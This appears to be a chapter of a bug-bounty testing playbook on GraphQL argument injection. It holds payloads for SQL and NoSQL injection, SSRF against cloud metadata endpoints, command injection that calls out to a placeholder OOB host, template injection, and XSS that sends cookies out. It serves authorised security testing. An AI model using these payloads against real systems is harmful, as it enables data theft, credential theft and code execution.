# 04 — Injection through GraphQL arguments (Phase 5)

GraphQL is just a transport. Every argument value flows into a resolver that may build SQL, a NoSQL
query, an HTTP request (SSRF), an OS command, or HTML. The strong type system stops *structural*
mistakes, not *injection* — a `String!` argument concatenated into SQL is still SQLi.

**Method:** from the schema, list every argument that is a filter, id, search term, URL, filename,
sort/order field, or raw JSON/`jsonb`. Fuzz each with the payloads below. Test inside **variables**
too (some WAFs only inspect the inline query string, not the `variables` object).

---

## 4.1 SQL / NoSQL injection

Any argument used for filtering/lookup:
```graphql
{ users(filter: "1' OR '1'='1") { id email } }
{ product(id: "1 OR SLEEP(5)") { name } }                  # time-based blind (watch latency)
{ search(q: "test' UNION SELECT username,password FROM users-- -") { title } }
{ orders(orderBy: "id; DROP--") { id } }                    # order-by injection (very common)
```
NoSQL (Mongo-backed resolvers, and array/object type confusion — see array-injection playbook):
```graphql
# If an arg accepts an input object / JSON, inject operators:
{ login(filter: {username:"admin", password:{ "$ne": null }}) { token } }
{ users(where: { age: { "$gt": 0 } }) { email } }
```
**Confirm like any SQLi:** boolean-diff, time-delay, then error-based. Feed the confirmed injection
point to **sqli-hunter-agent** / `sqlmap` (sqlmap can target GraphQL via `-r request.txt` with the
POST body). Hasura note: Hasura compiles to SQL safely *by default*, but **custom SQL functions,
`_where` with raw fragments, and action handlers** re-introduce injection — test those.

## 4.2 SSRF via URL-taking arguments

Any argument that is a URL, webhook, image source, callback, or "import from" is SSRF-prone:
```graphql
mutation { importFromUrl(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/") { data } }
mutation { createWebhook(endpoint: "http://localhost:6379/") { id } }
mutation { generatePdf(sourceUrl: "http://metadata.google.internal/computeMetadata/v1/") { url } }
{ fetchAvatar(imageUrl: "http://[::1]:80/") { bytes } }
```
Confirm with a collaborator/OOB host first (`http://YOUR_OOB/`), then pivot to cloud metadata
(IMDSv1 `169.254.169.254`, GCP `metadata.google.internal`, Azure `169.254.169.254/metadata`).
Blind SSRF still counts — prove the callback in your collaborator log. Chain to IMDS credential theft
for P1. (Use OOB/metadata-count proof; do not exfiltrate beyond the cap.)

## 4.3 OS command injection / RCE

Arguments that reach shell/format converters (image/PDF/video processing, `filename`, `format`,
export type):
```graphql
mutation { exportReport(format: "pdf; id > /tmp/x") { url } }
mutation { convertImage(filename: "a.png; curl http://OOB/$(whoami)") { url } }
```
Confirm blind via OOB DNS/HTTP. Also test **SSTI** where a resolver renders a template with your
input (`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`) — common in "email template" / "custom message" mutations.

## 4.4 XSS via GraphQL (stored/reflected downstream)

GraphQL itself isn't rendered, but the data you write via mutations is rendered elsewhere:
```graphql
mutation { updateProfile(bio: "<img src=x onerror=alert(document.domain)>") { id } }
mutation { createComment(body: "<svg onload=fetch('//OOB/'+document.cookie)>") { id } }
```
Then load the page that renders it. This is **stored XSS with a GraphQL injection vector** — report
against the rendering sink. Feed to **xss-hunter-agent** for payload crafting/WAF bypass.

## 4.5 Directive / query-level injection & abuse

- **`@skip`/`@include` argument confusion**, custom directives (`@auth`, `@cost`) that take arguments
  an attacker controls — test whether you can pass a directive that disables a check.
- **Variable coercion**: send a value of an unexpected type (array where scalar expected, object where
  string expected) — type-confusion can bypass validation and reach vulnerable code (see the array-
  injection playbook: always probe every argument as array/object).
- **Alias/fragment injection** to reach fields the query planner shouldn't expose.

---

## 4.6 Real disclosed examples

- **PortSwigger Academy** *"Bypassing GraphQL brute-force protections"* and the injection labs show
  argument values flowing unsanitized — the reproducible model for the above.
- **HackerOne-disclosed SSRF-via-GraphQL pattern:** "import/fetch from URL" mutations on multiple
  programs have yielded SSRF → cloud-metadata credential theft (P1). The GraphQL layer just delivers
  the attacker-controlled URL to a server-side fetcher.
- **Hasura custom-action / SQL-function injection:** disclosed cases where a custom action handler or
  raw SQL function concatenated a GraphQL argument into a query → SQLi, despite Hasura's safe core.
- **GraphQL → stored XSS:** numerous programs where a `bio`/`comment`/`displayName` mutation stored
  markup rendered unescaped in another user's browser → ATO via session theft.

## 4.7 Confirm & don't inflate

- SQLi/SSRF/RCE require **live proof** (delay, OOB callback, extracted metadata) — never
  "the argument looks injectable."
- Reflected XSS in a JSON GraphQL response body with `Content-Type: application/json` and no HTML
  sink is **not** XSS. You need a real HTML rendering sink.
- Type-confusion that errors out with no security effect = not a bug.

Next: `05-dos-batching-complexity.md`.
